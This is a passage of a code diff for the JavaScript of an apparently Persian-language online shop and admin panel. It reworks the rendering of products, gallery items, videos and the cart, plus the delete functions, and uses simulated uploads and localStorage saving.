+                        document.body.style.overflow = 'hidden';
+                    }
+                });
+            });
+        }
+
+        // Load features
+        function loadFeatures() {
+            featuresGrid.innerHTML = '';
+            
+            if (features.length === 0) {
+                featuresGrid.innerHTML = '<p style="text-align: center; grid-column: 1 / -1; color: var(--text-light); padding: 2rem;">هیچ امکانی وجود ندارد</p>';
+                return;
+            }
+            
+            features.forEach(feature => {
+                const featureCard = document.createElement('div');
+                featureCard.className = 'feature-card glass';
+                featureCard.innerHTML = `
+                    <div class="feature-icon">
+                        <i class="${feature.icon}"></i>
+                    </div>
+                    <h3>${feature.title}</h3>
+                    <p>${feature.description}</p>
+                `;
+                featuresGrid.appendChild(featureCard);
+            });
+        }
+
+        // Load videos
+        function loadVideos() {
+            videosGrid.innerHTML = '';
+            
+            if (videos.length === 0) {
+                videosGrid.innerHTML = '<p style="text-align: center; grid-column: 1 / -1; color: var(--text-light); padding: 2rem;">هیچ ویدیویی وجود ندارد</p>';
+                return;
+            }
+            
+            videos.forEach(video => {
+                const videoCard = document.createElement('div');
+                videoCard.className = 'video-card glass';
+                videoCard.innerHTML = `
+                    <div class="video-thumbnail" style="background-image: url('${video.thumbnail}')">
+                        <button class="video-play-btn" data-video="${video.videoUrl}">
+                            <i class="fas fa-play"></i>
+                        </button>
+                    </div>
+                    <div class="video-content">
+                        <div class="video-category">${video.category}</div>
+                        <h3 class="video-title">${video.title}</h3>
+                        <p class="video-description">${video.description}</p>
+                        <div class="video-footer">
+                            <div class="video-duration"><i class="fas fa-clock"></i> ${video.duration}</div>
+                        </div>
+                    </div>
+                `;
+                videosGrid.appendChild(videoCard);
+            });
+        }
+
+        // Upload file to server (simulated)
+        async function uploadFile(file, fileType) {
+            return new Promise((resolve) => {
+                setTimeout(() => {
+                    // Simulate successful upload
+                    const fileUrl = `/uploads/${fileType}s/${Date.now()}-${file.name}`;
+                    resolve({ 
+                        success: true, 
+                        fileUrl: fileUrl,
+                        message: 'فایل با موفقیت آپلود شد'
+                    });
+                }, 1500);
+            });
+        }
+
+        // Save data to server (using localStorage as fallback)
+        async function saveToServer(type, data) {
+            try {
+                localStorage.setItem(`kali_tools_${type}`, JSON.stringify(data));
+                return true;
+            } catch (error) {
+                console.error('Save error:', error);
+                return false;
+            }
+        }
+
+        // Update cart
+        function updateCart() {
+            cartItems.innerHTML = '';
+            let total = 0;
+            
+            if (cart.length === 0) {
+                emptyCartMessage.style.display = 'block';
+                cartCount.textContent = '0';
+                cartTotalPrice.textContent = '۰ AFN';
+                return;
+            }
+            
+            emptyCartMessage.style.display = 'none';
+            
+            cart.forEach(item => {
+                total += item.price * item.quantity;
+                
+                const cartItem = document.createElement('div');
+                cartItem.className = 'cart-item';
+                cartItem.innerHTML = `
+                    <div class="cart-item-image">
+                        <i class="fas fa-box"></i>
+                    </div>
+                    <div class="cart-item-details">
+                        <h4 class="cart-item-title">${item.name}</h4>
+                        <div class="cart-item-price">${formatPrice(item.price)} AFN</div>
+                        <div class="cart-item-quantity">تعداد: ${item.quantity}</div>
+                    </div>
+                    <button class="remove-item" data-id="${item.id}">
+                        <i class="fas fa-times"></i>
+                    </button>
+                `;
+                cartItems.appendChild(cartItem);
+            });
+            
+            cartCount.textContent = cart.reduce((sum, item) => sum + item.quantity, 0);
+            cartTotalPrice.textContent = `${formatPrice(total)} AFN`;
+            
+            // Add event listeners to remove buttons
+            document.querySelectorAll('.remove-item').forEach(button => {
+                button.addEventListener('click', function() {
+                    const id = this.getAttribute('data-id');
+                    removeFromCart(id);
+                });
+            });
+        }
+
+        // Remove from cart
+        function removeFromCart(id) {
+            cart = cart.filter(item => item.id !== id);
+            updateCart();
+            showToast('محصول از سبد خرید حذف شد', 'success');
+        }
+
+        // Format price
+        function formatPrice(price) {
+            return price.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+        }
+
+        // Show toast notification
+        function showToast(message, type = 'success') {
+            toast.textContent = message;
+            toast.className = 'toast';
+            toast.classList.add(type);
+            toast.classList.add('active');
+            
+            setTimeout(() => {
+                toast.classList.remove('active');
+            }, 3000);
+        }
+
+        // Delete gallery item
+        async function deleteGalleryItem(id) {
+            if (confirm('آیا از حذف این تصویر اطمینان دارید؟')) {
+                galleryItems = galleryItems.filter(item => item.id !== id);
                 
                 // Save to localStorage
                 const success = await saveToServer('gallery', galleryItems);
                 if (success) {
                     loadGalleryItems();
                     loadGalleryAdmin();
-                    document.getElementById('gallery-form').reset();
-                    document.getElementById('gallery-image-preview').style.display = 'none';
-                    document.getElementById('gallery-image-upload').querySelector('p').textContent = 'برای آپلود تصویر کلیک کنید';
-                    showToast('تصویر جدید به گالری اضافه شد', 'success');
                     updateAdminStats();
-                    updateLastUpdate();
+                    showToast('تصویر با موفقیت حذف شد', 'success');
                 } else {
-                    showToast('خطا در ذخیرهسازی دادهها', 'error');
+                    showToast('خطا در حذف تصویر', 'error');
                 }
-            } else {
-                showToast('خطا در آپلود تصویر', 'error');
             }
-        } catch (error) {
-            console.error('Error adding gallery item:', error);
-            showToast('خطا در افزودن تصویر به گالری', 'error');
         }
-    });
 
-    // Products form
-    document.getElementById('add-product-btn').addEventListener('click', async () => {
-        const name = document.getElementById('product-name').value;
-        const category = document.getElementById('product-category').value;
-        const price = document.getElementById('product-price').value;
-        const description = document.getElementById('product-description').value;
-        const imageInput = document.getElementById('product-image-input');
-        
-        if (!name || !category || !price || !description || !imageInput.files[0]) {
-            showToast('لطفاً تمام فیلدها را پر کنید و تصویر آپلود کنید', 'error');
-            return;
-        }
-        
-        try {
-            showToast('در حال آپلود محصول...', 'success');
-            
-            // Upload image
-            const file = imageInput.files[0];
-            const uploadResult = await uploadFile(file, 'image');
-            
-            if (uploadResult.success) {
-                let videoUrl = '';
-                const videoFileInput = document.getElementById('product-video-input');
-                const videoFile = videoFileInput.files[0];
-                
-                if (videoFile) {
-                    const videoUploadResult = await uploadFile(videoFile, 'video');
-                    if (videoUploadResult.success) {
-                        videoUrl = videoUploadResult.fileUrl;
-                    }
-                }
-                
-                const newProduct = {
-                    id: products.length > 0 ? Math.max(...products.map(product => product.id)) + 1 : 1,
-                    name: name,
-                    category: category,
-                    price: parseInt(price),
-                    description: description,
-                    image: uploadResult.fileUrl,
-                    video: videoUrl
-                };
-                
-                products.push(newProduct);
+        // Delete product
+        async function deleteProduct(id) {
+            if (confirm('آیا از حذف این محصول اطمینان دارید؟')) {
+                products = products.filter(product => product.id !== id);
                 
                 // Save to localStorage
                 const success = await saveToServer('products', products);
                 if (success) {
                     loadProducts();
                     loadProductsAdmin();
-                    document.getElementById('product-form').reset();
-                    document.getElementById('product-image-preview').style.display = 'none';
-                    document.getElementById('product-video-preview').style.display = 'none';
-                    document.getElementById('product-image-upload').querySelector('p').textContent = 'برای آپلود تصویر کلیک کنید';
-                    document.getElementById('product-video-upload').querySelector('p').textContent = 'برای آپلود ویدیو کلیک کنید';
-                    showToast('محصول جدید با موفقیت اضافه شد', 'success');
                     updateAdminStats();
-                    updateLastUpdate();
+                    showToast('محصول با موفقیت حذف شد', 'success');
                 } else {
-                    showToast('خطا در ذخیرهسازی دادهها', 'error');
+                    showToast('خطا در حذف محصول', 'error');
                 }
-            } else {
-                showToast('خطا در آپلود تصویر', 'error');
             }
-        } catch (error) {
-            console.error('Error adding product:', error);
-            showToast('خطا در افزودن محصول', 'error');
         }
-    });
 
-    // Videos form
-    document.getElementById('add-video-btn').addEventListener('click', async () => {
-        const title = document.getElementById('video-title').value;
-        const category = document.getElementById('video-category').value;
-        const description = document.getElementById('video-description').value;
-        const duration = document.getElementById('video-duration').value;
-        const videoInput = document.getElementById('video-file-input');
-        
-        if (!title || !category || !description || !duration || !videoInput.files[0]) {
-            showToast('لطفاً تمام فیلدها را پر کنید و ویدیو آپلود کنید', 'error');
-            return;
-        }
-        
-        try {
-            showToast('در حال آپلود ویدیو...', 'success');
-            
-            // Upload video
-            const file = videoInput.files[0];
-            const uploadResult = await uploadFile(file, 'video');
-            
-            if (uploadResult.success) {
-                let thumbnailUrl = 'https://i.imgur.com/3Q7J5Qj.png'; // Default thumbnail
-                const thumbnailFileInput = document.getElementById('video-thumbnail-input');
-                const thumbnailFile = thumbnailFileInput.files[0];
-                
-                if (thumbnailFile) {
-                    const thumbnailUploadResult = await uploadFile(thumbnailFile, 'image');
-                    if (thumbnailUploadResult.success) {
-                        thumbnailUrl = thumbnailUploadResult.fileUrl;
-                    }
-                }
-                
-                const newVideo = {
-                    id: videos.length > 0 ? Math.max(...videos.map(video => video.id)) + 1 : 1,
-                    title: title,
-                    description: description,
-                    videoUrl: uploadResult.fileUrl,
-                    thumbnail: thumbnailUrl,
-                    duration: duration,
-                    category: category
-                };
-                
-                videos.push(newVideo);
+        // Delete video
+        async function deleteVideo(id) {
+            if (confirm('آیا از حذف این ویدیو اطمینان دارید؟')) {
+                videos = videos.filter(video => video.id !== id);
                 
                 // Save to localStorage
                 const success = await saveToServer('videos', videos);
                 if (success) {
                     loadVideos();
                     loadVideosAdmin();
-                    document.getElementById('video-form').reset();
-                    document.getElementById('video-file-preview').style.display = 'none';
-                    document.getElementById('video-thumbnail-preview').style.display = 'none';
-                    document.getElementById('video-file-upload').querySelector('p').textContent = 'برای آپلود ویدیو کلیک کنید';
-                    document.getElementById('video-thumbnail-upload').querySelector('p').textContent = 'برای آپلود تصویر بندانگشتی کلیک کنید';
-                    showToast('ویدیو جدید با موفقیت اضافه شد', 'success');
                     updateAdminStats();
-                    updateLastUpdate();
+                    showToast('ویدیو با موفقیت حذف شد', 'success');
                 } else {
-                    showToast('خطا در ذخیرهسازی دادهها', 'error');
+                    showToast('خطا در حذف ویدیو', 'error');
                 }
-            } else {
-                showToast('خطا در آپلود ویدیو', 'error');
             }
-        } catch (error) {
-            console.error('Error adding video:', error);
-            showToast('خطا در افزودن ویدیو', 'error');
         }
-    });
 
-    // Ethical form
-    document.getElementById('ethical-form').addEventListener('submit', async (e) => {
-        e.preventDefault();
-        const title = document.getElementById('ethical-title').value;
-        const description = document.getElementById('ethical-description').value;
-        const warning = document.getElementById('ethical-warning').value;
-        const footer = document.getElementById('ethical-footer').value;
-        const allowed = document.getElementById('ethical-allowed').value;
-        const prohibited = document.getElementById('ethical-prohibited').value;
-        
-        document.getElementById('ethical-title').textContent = title;
-        document.getElementById('ethical-description').textContent = description;
-        document.getElementById('ethical-warning').innerHTML = `<h3><i class="fas fa-exclamation-triangle"></i> هشدار مسئولیت اخلاقی</h3><p>${warning}</p>`;
-        document.getElementById('ethical-footer').textContent = footer;
-        
-        // Update ethical list
-        document.getElementById('ethical-list').innerHTML = `
-            <div class="ethical-item allowed">
-                <div class="ethical-icon"><i class="fas fa-check-circle"></i></div>
-                <div>
-                    <h4>موارد مجاز</h4>
-                    <p>${allowed}</p>
-                </div>
-            </div>
-            <div class="ethical-item prohibited">
-                <div class="ethical-icon"><i class="fas fa-times-circle"></i></div>
-                <div>
-                    <h4>موارد غیرمجاز</h4>
-                    <p>${prohibited}</p>
-                </div>
-            </div>
-        `;
-        
-        // Save to localStorage
-        const success = await saveToServer('ethical', {
-            title,
-            description,
-            warning: `<h3><i class="fas fa-exclamation-triangle"></i> هشدار مسئولیت اخلاقی</h3><p>${warning}</p>`,
-            footer,
-            allowed,
-            prohibited
-        });
-        
-        if (success) {
-            showToast('بخش راهنمای اخلاقی با موفقیت بهروزرسانی شد', 'success');
-            updateLastUpdate();
-        } else {
-            showToast('خطا در ذخیرهسازی دادهها', 'error');
+        // Update admin statistics
+        function updateAdminStats() {
+            document.getElementById('stat-products').textContent = products.length;
+            document.getElementById('stat-gallery').textContent = galleryItems.length;
+            document.getElementById('stat-videos').textContent = videos.length;
+            document.getElementById('stat-sales').textContent = '۴۲';
         }
-    });
 
-    // Footer form
-    document.getElementById('footer-form').addEventListener('submit', async (e) => {
-        e.preventDefault();
-        const about = document.getElementById('footer-about').value;
-        const address = document.getElementById('footer-address').value;
-        const phone = document.getElementById('footer-phone').value;
-        const email = document.getElementById('footer-email').value;
-        const copyright = document.getElementById('footer-copyright').value;
-        
-        document.getElementById('footer-about-text').textContent = about;
-        document.getElementById('footer-address-text').textContent = address;
-        document.getElementById('footer-phone-text').textContent = phone;
-        document.getElementById('footer-email-text').textContent = email;
-        document.getElementById('footer-copyright-text').textContent = copyright;
-        
-        // Save to localStorage
-        const success = await saveToServer('footer', {
-            about,
-            address,
-            phone,
-            email,
-            copyright
-        });
-        
-        if (success) {
-            showToast('فوتر با موفقیت بهروزرسانی شد', 'success');
-            updateLastUpdate();
-        } else {
-            showToast('خطا در ذخیرهسازی دادهها', 'error');
+        // Update last update time
+        function updateLastUpdate() {
+            const now = new Date();
+            document.getElementById('last-update').textContent = now.toLocaleString('fa-IR');
         }
-    });
 
-    // Add feature button
-    document.getElementById('add-feature-btn').addEventListener('click', () => {
-        const featuresList = document.getElementById('features-list');
-        const newFeatureId = features.length > 0 ? Math.max(...features.map(feature => feature.id)) + 1 : 1;
-        
-        const featureElement = document.createElement('div');
-        featureElement.className = 'feature-admin-item';
-        featureElement.innerHTML = `
-            <div class="form-group">
-                <label>آیکون</label>
-                <input type="text" class="form-control feature-icon" value="fas fa-shield-alt" placeholder="کلاس آیکون FontAwesome">
-            </div>
-            <div class="form-group">
-                <label>عنوان</label>
-                <input type="text" class="form-control feature-title" placeholder="عنوان امکان">
-            </div>
-            <div class="form-group">
-                <label>توضیحات</label>
-                <textarea class="form-control feature-description" placeholder="توضیحات امکان"></textarea>
-            </div>
-            <button type="button" class="btn btn-danger remove-feature" data-id="${newFeatureId}"><i class="fas fa-trash"></i> حذف</button>
-            <hr>
-        `;
-        
-        featuresList.appendChild(featureElement);
-        
-        // Add event listener to remove button
-        featureElement.querySelector('.remove-feature').addEventListener('click', function() {
-            const id = parseInt(this.getAttribute('data-id'));
-            featuresList.removeChild(featureElement);
-        });
-    });
-}
-
-// Load gallery items
-function loadGalleryItems() {
-    galleryGrid.innerHTML = '';
-    
-    if (galleryItems.length === 0) {
-        galleryGrid.innerHTML = '<p style="text-align: center; grid-column: 1 / -1; color: var(--text-light); padding: 2rem;">هیچ تصویری در گالری وجود ندارد</p>';
-        return;
-    }
-    
-    galleryItems.forEach(item => {
-        const galleryItem = document.createElement('div');
-        galleryItem.className = 'gallery-item';
-        galleryItem.style.backgroundImage = `url('${item.image}')`;
-        galleryItem.innerHTML = `
-            <div class="gallery-actions">
-                <button class="gallery-action-btn delete-gallery-item" data-id="${item.id}">
-                    <i class="fas fa-trash"></i>
-                </button>
-            </div>
-            <div class="gallery-item-overlay">
-                <h3>${item.title}</h3>
-                <p>${item.description}</p>
-            </div>
-        `;
-        galleryGrid.appendChild(galleryItem);
-    });
-    
-    // Add event listeners to delete buttons
-    document.querySelectorAll('.delete-gallery-item').forEach(button => {
-        button.addEventListener('click', (e) => {
-            e.stopPropagation();
-            const id = parseInt(button.getAttribute('data-id'));
-            deleteGalleryItem(id);
-        });
-    });
-}
-
-// Load products
-function loadProducts() {
-    productsGrid.innerHTML = '';
-    
-    if (products.length === 0) {
-        productsGrid.innerHTML = '<p style="text-align: center; grid-column: 1 / -1; color: var(--text-light); padding: 2rem;">هیچ محصولی وجود ندارد</p>';
-        return;
-    }
-    
-    products.forEach(product => {
-        const productCard = document.createElement('div');
-        productCard.className = 'product-card';
-        productCard.innerHTML = `
-            <div class="product-image" style="background-image: url('${product.image}')">
-                ${product.video ? `<button class="video-play-btn product-video-btn" data-video="${product.video}">
-                    <i class="fas fa-play"></i>
-                </button>` : ''}
-            </div>
-            <div class="product-content">
-                <div class="product-category">${product.category}</div>
-                <h3 class="product-title">${product.name}</h3>
-                <p class="product-description">${product.description}</p>
-                <div class="product-footer">
-                    <div class="product-price"><span class="currency">AFN</span> ${formatPrice(product.price)}</div>
-                    <button class="btn btn-primary add-to-cart" data-id="${product.id}" data-name="${product.name}" data-price="${product.price}"><i class="fas fa-cart-plus"></i> افزودن</button>
-                </div>
-            </div>
-        `;
-        productsGrid.appendChild(productCard);
-    });
-    
-    // Add event listeners to video buttons
-    document.querySelectorAll('.product-video-btn').forEach(button => {
-        button.addEventListener('click', (e) => {
-            e.stopPropagation();
-            const videoUrl = button.getAttribute('data-video');
-            if (videoUrl) {
-                videoModalPlayer.src = SERVER_URL + videoUrl;
-                videoModal.classList.add('active');
-                document.body.style.overflow = 'hidden';
+        // Load gallery admin
+        function loadGalleryAdmin() {
+            const galleryItemsList = document.getElementById('gallery-items-list');
+            galleryItemsList.innerHTML = '';
+            
+            if (galleryItems.length === 0) {
+                galleryItemsList.innerHTML = '<p style="text-align: center; color: #ccc; padding: 1rem;">هیچ تصویری وجود ندارد</p>';
+                return;
             }
-        });
-    });
-}
-
-// Load features
-function loadFeatures() {
-    featuresGrid.innerHTML = '';
-    
-    if (features.length === 0) {
-        featuresGrid.innerHTML = '<p style="text-align: center; grid-column: 1 / -1; color: var(--text-light); padding: 2rem;">هیچ امکانی وجود ندارد</p>';
-        return;
-    }
-    
-    features.forEach(feature => {
-        const featureCard = document.createElement('div');
-        featureCard.className = 'feature-card';
-        featureCard.innerHTML = `
-            <div class="feature-icon">
-                <i class="${feature.icon}"></i>
-            </div>
-            <h3>${feature.title}</h3>
-            <p>${feature.description}</p>
-        `;
-        featuresGrid.appendChild(featureCard);
-    });
-}
-
-// Load videos
-function loadVideos() {
-    videosGrid.innerHTML = '';
-    
-    if (videos.length === 0) {
-        videosGrid.innerHTML = '<p style="text-align: center; grid-column: 1 / -1; color: var(--text-light); padding: 2rem;">هیچ ویدیویی وجود ندارد</p>';
-        return;
-    }
-    
-    videos.forEach(video => {
-        const videoCard = document.createElement('div');
-        videoCard.className = 'video-card';
-        videoCard.innerHTML = `
-            <div class="video-thumbnail" style="background-image: url('${video.thumbnail}')">
-                <button class="video-play-btn" data-video="${video.videoUrl}">
-                    <i class="fas fa-play"></i>
-                </button>
-            </div>
-            <div class="video-content">
-                <div class="video-category">${video.category}</div>
-                <h3 class="video-title">${video.title}</h3>
-                <p class="video-description">${video.description}</p>
-                <div class="video-footer">
-                    <div class="video-duration"><i class="fas fa-clock"></i> ${video.duration}</div>
-                </div>
-            </div>
-        `;
-        videosGrid.appendChild(videoCard);
-    });
-}
-
-// Upload file to server (simulated)
-async function uploadFile(file, fileType) {
-    return new Promise((resolve) => {
-        setTimeout(() => {
-            // Simulate successful upload
-            const fileUrl = `/uploads/${fileType}s/${Date.now()}-${file.name}`;
-            resolve({ 
-                success: true, 
-                fileUrl: fileUrl,
-                message: 'فایل با موفقیت آپلود شد'
+            
+            galleryItems.forEach(item => {
+                const itemElement = document.createElement('div');
+                itemElement.style.display = 'flex';
+                itemElement.style.justifyContent = 'space-between';
+                itemElement.style.alignItems = 'center';
+                itemElement.style.padding = '0.5rem 0';
+                itemElement.style.borderBottom = '1px solid rgba(255,255,255,0.1)';
+                
+                itemElement.innerHTML = `
+                    <div style="display: flex; align-items: center; gap: 10px;">
+                        <div style="width: 40px; height: 40px; background-image: url('${item.image}'); background-size: cover; background-position: center; border-radius: 5px;"></div>
+                        <span>${item.title}</span>
+                    </div>
+                    <button class="gallery-action-btn delete-gallery-item-list" data-id="${item.id}">
+                        <i class="fas fa-trash"></i>
+                    </button>
+                `;
+                
+                galleryItemsList.appendChild(itemElement);
             });
-        }, 1500);
-    });
-}
-
-// Send order to server (simulated)
-async function sendOrderToServer(name, phone, telegram, address, payment) {
-    return new Promise((resolve) => {
-        setTimeout(() => {
-            // Simulate successful order submission
-            console.log('Order submitted:', { name, phone, telegram, address, payment, cart });
-            resolve(true);
-        }, 1000);
-    });
-}
-
-// Save data to server (using localStorage as fallback)
-async function saveToServer(type, data) {
-    try {
-        localStorage.setItem(`kali_tools_${type}`, JSON.stringify(data));
-        return true;
-    } catch (error) {
-        console.error('Save error:', error);
-        return false;
-    }
-}
-
-// Update cart
-function updateCart() {
-    cartItems.innerHTML = '';
-    let total = 0;
-    
-    if (cart.length === 0) {
-        emptyCartMessage.style.display = 'block';
-        cartCount.textContent = '0';
-        cartTotalPrice.textContent = '۰ AFN';
-        return;
-    }
-    
-    emptyCartMessage.style.display = 'none';
-    
-    cart.forEach(item => {
-        total += item.price * item.quantity;
-        
-        const cartItem = document.createElement('div');
-        cartItem.className = 'cart-item';
-        cartItem.innerHTML = `
-            <div class="cart-item-image">
-                <i class="fas fa-box"></i>
-            </div>
-            <div class="cart-item-details">
-                <h4 class="cart-item-title">${item.name}</h4>
-                <div class="cart-item-price">${formatPrice(item.price)} AFN</div>
-                <div class="cart-item-quantity">تعداد: ${item.quantity}</div>
-            </div>
-            <button class="remove-item" data-id="${item.id}">
-                <i class="fas fa-times"></i>
-            </button>
-        `;
-        cartItems.appendChild(cartItem);
-    });
-    
-    cartCount.textContent = cart.reduce((sum, item) => sum + item.quantity, 0);
-    cartTotalPrice.textContent = `${formatPrice(total)} AFN`;
-    
-    // Add event listeners to remove buttons
-    document.querySelectorAll('.remove-item').forEach(button => {
-        button.addEventListener('click', function() {
-            const id = this.getAttribute('data-id');
-            removeFromCart(id);
-        });
-    });
-}
-
-// Remove from cart
-function removeFromCart(id) {
-    cart = cart.filter(item => item.id !== id);
-    updateCart();
-    showToast('محصول از سبد خرید حذف شد', 'success');
-}
-
-// Format price
-function formatPrice(price) {
-    return price.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
-}
-
-// Show toast notification
-function showToast(message, type = 'success') {
-    toast.textContent = message;
-    toast.className = 'toast';
-    toast.classList.add(type);
-    toast.classList.add('active');
-    
-    setTimeout(() => {
-        toast.classList.remove('active');
-    }, 3000);
-}
-
-// Delete gallery item
-async function deleteGalleryItem(id) {
-    if (confirm('آیا از حذف این تصویر اطمینان دارید؟')) {
-        galleryItems = galleryItems.filter(item => item.id !== id);
-        
-        // Save to localStorage
-        const success = await saveToServer('gallery', galleryItems);
-        if (success) {
-            loadGalleryItems();
-            loadGalleryAdmin();
-            updateAdminStats();
-            showToast('تصویر با موفقیت حذف شد', 'success');
-        } else {
-            showToast('خطا در حذف تصویر', 'error');
         }
-    }
-}
 
-// Delete product
-async function deleteProduct(id) {
-    if (confirm('آیا از حذف این محصول اطمینان دارید؟')) {
-        products = products.filter(product => product.id !== id);
-        
-        // Save to localStorage
-        const success = await saveToServer('products', products);
-        if (success) {
-            loadProducts();
-            loadProductsAdmin();
-            updateAdminStats();
-            showToast('محصول با موفقیت حذف شد', 'success');
-        } else {
-            showToast('خطا در حذف محصول', 'error');
+        // Load products admin
+        function loadProductsAdmin() {
+            const productsList = document.getElementById('products-list');
+            productsList.innerHTML = '';
+            
+            if (products.length === 0) {
+                productsList.innerHTML = '<p style="text-align: center; color: #ccc; padding: 1rem;">هیچ محصولی وجود ندارد</p>';
+                return;
+            }
+            
+            products.forEach(product => {
+                const productElement = document.createElement('div');
+                productElement.style.display = 'flex';
+                productElement.style.justifyContent = 'space-between';
+                productElement.style.alignItems = 'center';
+                productElement.style.padding = '0.5rem 0';
+                productElement.style.borderBottom = '1px solid rgba(255,255,255,0.1)';
+                
+                productElement.innerHTML = `
+                    <div style="display: flex; align-items: center; gap: 10px;">
+                        <div style="width: 40px; height: 40px; background-image: url('${product.image}'); background-size: cover; background-position: center; border-radius: 5px;"></div>
+                        <div>
+                            <div style="font-weight: bold;">${product.name}</div>
+                            <div style="font-size: 0.8rem; color: #ccc;">${formatPrice(product.price)} AFN</div>
+                        </div>
+                    </div>
+                    <button class="gallery-action-btn delete-product-list" data-id="${product.id}">
+                        <i class="fas fa-trash"></i>
+                    </button>
+                `;
+                
+                productsList.appendChild(productElement);
+            });
         }
-    }
-}
 
-// Delete video
-async function deleteVideo(id) {
-    if (confirm('آیا از حذف این ویدیو اطمینان دارید؟')) {
-        videos = videos.filter(video => video.id !== id);
-        
-        // Save to localStorage
-        const success = await saveToServer('videos', videos);
-        if (success) {
-            loadVideos();
-            loadVideosAdmin();
-            updateAdminStats();
-            showToast('ویدیو با موفقیت حذف شد', 'success');
-        } else {
-            showToast('خطا در حذف ویدیو', 'error');
+        // Load videos admin
+        function loadVideosAdmin() {
+            const videosList = document.getElementById('videos-list');
+            videosList.innerHTML = '';
+            
+            if (videos.length === 0) {
+                videosList.innerHTML = '<p style="text-align: center; color: #ccc; padding: 1rem;">هیچ ویدیویی وجود ندارد</p>';
+                return;
+            }
+            
+            videos.forEach(video => {
+                const videoElement = document.createElement('div');
+                videoElement.style.display = 'flex';
+                videoElement.style.justifyContent = 'space-between';
+                videoElement.style.alignItems = 'center';
+                videoElement.style.padding = '0.5rem 0';
+                videoElement.style.borderBottom = '1px solid rgba(255,255,255,0.1)';
+                
+                videoElement.innerHTML = `
+                    <div style="display: flex; align-items: center; gap: 10px;">
+                        <div style="width: 40px; height: 40px; background-image: url('${video.thumbnail}'); background-size: cover; background-position: center; border-radius: 5px;"></div>
+                        <div>
+                            <div style="font-weight: bold;">${video.title}</div>
+                            <div style="font-size: 0.8rem; color: #ccc;">${video.duration} - ${video.category}</div>
+                        </div>
+                    </div>
+                    <button class="gallery-action-btn delete-video-list" data-id="${video.id}">
+                        <i class="fas fa-trash"></i>
+                    </button>
+                `;
+                
+                videosList.appendChild(videoElement);
+            });
         }
-    }
-}
 
-// Update admin statistics
-function updateAdminStats() {
-    document.getElementById('stat-products').textContent = products.length;
-    document.getElementById('stat-gallery').textContent = galleryItems.length;
-    document.getElementById('stat-videos').textContent = videos.length;
-    document.getElementById('stat-sales').textContent = '۴۲';
-}
-
-// Update last update time
-function updateLastUpdate() {
-    const now = new Date();
-    document.getElementById('last-update').textContent = now.toLocaleString('fa-IR');
-}
-
-// Load gallery admin
-function loadGalleryAdmin() {
-    const galleryItemsList = document.getElementById('gallery-items-list');
-    galleryItemsList.innerHTML = '';
-    
-    if (galleryItems.length === 0) {
-        galleryItemsList.innerHTML = '<p style="text-align: center; color: #ccc; padding: 1rem;">هیچ تصویری وجود ندارد</p>';
-        return;
-    }
-    
-    galleryItems.forEach(item => {
-        const itemElement = document.createElement('div');
-        itemElement.style.display = 'flex';
-        itemElement.style.justifyContent = 'space-between';
-        itemElement.style.alignItems = 'center';
-        itemElement.style.padding = '0.5rem 0';
-        itemElement.style.borderBottom = '1px solid rgba(255,255,255,0.1)';
-        
-        itemElement.innerHTML = `
-            <div style="display: flex; align-items: center; gap: 10px;">
-                <div style="width: 40px; height: 40px; background-image: url('${item.image}'); background-size: cover; background-position: center; border-radius: 5px;"></div>
-                <span>${item.title}</span>
-            </div>
-            <button class="gallery-action-btn delete-gallery-item-list" data-id="${item.id}">
-                <i class="fas fa-trash"></i>
-            </button>
-        `;
-        
-        galleryItemsList.appendChild(itemElement);
-    });
-}
-
-// Load products admin
-function loadProductsAdmin() {
-    const productsList = document.getElementById('products-list');
-    productsList.innerHTML = '';
-    
-    if (products.length === 0) {
-        productsList.innerHTML = '<p style="text-align: center; color: #ccc; padding: 1rem;">هیچ محصولی وجود ندارد</p>';
-        return;
-    }
-    
-    products.forEach(product => {
-        const productElement = document.createElement('div');
-        productElement.style.display = 'flex';
-        productElement.style.justifyContent = 'space-between';
-        productElement.style.alignItems = 'center';
-        productElement.style.padding = '0.5rem 0';
-        productElement.style.borderBottom = '1px solid rgba(255,255,255,0.1)';
-        
-        productElement.innerHTML = `
-            <div style="display: flex; align-items: center; gap: 10px;">
-                <div style="width: 40px; height: 40px; background-image: url('${product.image}'); background-size: cover; background-position: center; border-radius: 5px;"></div>
-                <div>
-                    <div style="font-weight: bold;">${product.name}</div>
-                    <div style="font-size: 0.8rem; color: #ccc;">${formatPrice(product.price)} AFN</div>
-                </div>
-            </div>
-            <button class="gallery-action-btn delete-product-list" data-id="${product.id}">
-                <i class="fas fa-trash"></i>
-            </button>
-        `;
-        
-        productsList.appendChild(productElement);
-    });
-}
-
-// Load videos admin
-function loadVideosAdmin() {
-    const videosList = document.getElementById('videos-list');
-    videosList.innerHTML = '';
-    
-    if (videos.length === 0) {
-        videosList.innerHTML = '<p style="text-align: center; color: #ccc; padding: 1rem;">هیچ ویدیویی وجود ندارد</p>';
-        return;
-    }
-    
-    videos.forEach(video => {
-        const videoElement = document.createElement('div');
-        videoElement.style.display = 'flex';
-        videoElement.style.justifyContent = 'space-between';
-        videoElement.style.alignItems = 'center';
-        videoElement.style.padding = '0.5rem 0';
-        videoElement.style.borderBottom = '1px solid rgba(255,255,255,0.1)';
-        
-        videoElement.innerHTML = `
-            <div style="display: flex; align-items: center; gap: 10px;">
-                <div style="width: 40px; height: 40px; background-image: url('${video.thumbnail}'); background-size: cover; background-position: center; border-radius: 5px;"></div>
-                <div>
-                    <div style="font-weight: bold;">${video.title}</div>
-                    <div style="font-size: 0.8rem; color: #ccc;">${video.duration} - ${video.category}</div>
-                </div>
-            </div>
-            <button class="gallery-action-btn delete-video-list" data-id="${video.id}">
-                <i class="fas fa-trash"></i>
-            </button>
-        `;
-        
-        videosList.appendChild(videoElement);
-    });
-}
-
-// Load features admin
-function loadFeaturesAdmin() {
-    // Features are already loaded in the form
-}
-
-// Load ethical admin
-function loadEthicalAdmin() {
-    // Ethical content is already loaded in the form
-}
-
-// Load footer admin
-function loadFooterAdmin() {
-    // Footer content is already loaded in the form
-}
-
-// Load hero admin
-function loadHeroAdmin() {
-    // Hero content is already loaded in the form
-}
-
-// Backup data
-function backupData() {
-    const data = {
-        hero: {
-            title: document.getElementById('hero-title').textContent,
-            description: document.getElementById('hero-description').textContent
-        },
-        features: features,
-        gallery: galleryItems,
-        videos: videos,
-        products: products,
-        ethical: {
-            title: document.getElementById('ethical-title').textContent,
-            description: document.getElementById('ethical-description').textContent,
-            warning: document.getElementById('ethical-warning').innerHTML,
-            footer: document.getElementById('ethical-footer').textContent
-        },
-        footer: {
-            about: document.getElementById('footer-about-text').textContent,
